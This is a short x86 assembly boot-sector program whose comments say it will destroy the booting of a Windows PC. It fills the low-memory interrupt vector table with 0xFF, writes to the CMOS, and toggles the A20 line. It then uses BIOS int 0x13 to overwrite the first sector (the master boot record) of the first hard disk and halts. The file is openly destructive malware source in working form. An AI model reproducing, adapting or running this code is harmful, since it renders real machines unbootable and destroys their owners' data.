;this code will DESTROY THE BOOTING OF A WINDOWS PC. DO NOT RUN THIS.
;code written by G Mort himself.

org 0x7C00
bits 16

_start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    
    mov cx, 0x0400
    mov di, 0x0000
    mov al, 0xFF
    rep stosb
    
    mov al, 0x80
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    
    in al, 0x92
    or al, 0x02
    out 0x92, al
    in al, 0x92
    and al, 0xFD
    out 0x92, al
    
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    mov bx, 0x0000
    int 0x13
    
    hlt
    jmp _start

    times 510-($-$$) db 0
    dw 0xAA55
